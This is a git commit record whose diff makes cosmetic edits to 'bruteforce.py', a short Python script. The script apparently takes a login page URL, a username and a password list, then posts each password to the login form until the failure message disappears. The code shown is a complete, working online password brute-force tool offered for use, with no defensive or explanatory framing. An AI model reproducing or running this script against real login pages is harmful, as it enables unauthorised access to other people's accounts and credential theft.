f012d1d81b75a5d4cbd0758962f7fb6433bdb4af
iftekharmickey <66146458+iftekharmickey@users.noreply.github.com>
2021-12-09 09:33:35 +0600

    Update bruteforce.py

--- bruteforce.py
+++ bruteforce.py
@@ -2,16 +2,16 @@ import requests
 from termcolor import colored
 
 url = input('[+] Enter Page URL: ')
-username = input('[+] Enter Username For The Account To Bruteforce: ')
-password_file = input('[+] Enter Password File To Use: ')
+username = input('[+] Enter Username: ')
+password_file = input('[+] Enter Password List: ')
 login_failed_string = input('[+] Enter String That Occurs When Login Fails: ')
 
-def cracking(username,url):
+def cracking(username, url):
     for password in passwords:
         password = password.strip()
         print(colored(('Trying: ' + password), 'red'))
-        data = {'username':username,'password':password,'Login':'submit'}
-        response = requests.post(url, data=data)
+        data = {'username': username,'password': password,'Login': 'submit'}
+        response = requests.post(url, data = data)
         if login_failed_string in response.content.decode():
             pass
         else:
@@ -22,4 +22,4 @@ def cracking(username,url):
 with open(password_file, 'r') as passwords:
     cracking(username,url)
 
-print('[!] Password Not In List')
+print('[!] Password Not in List')
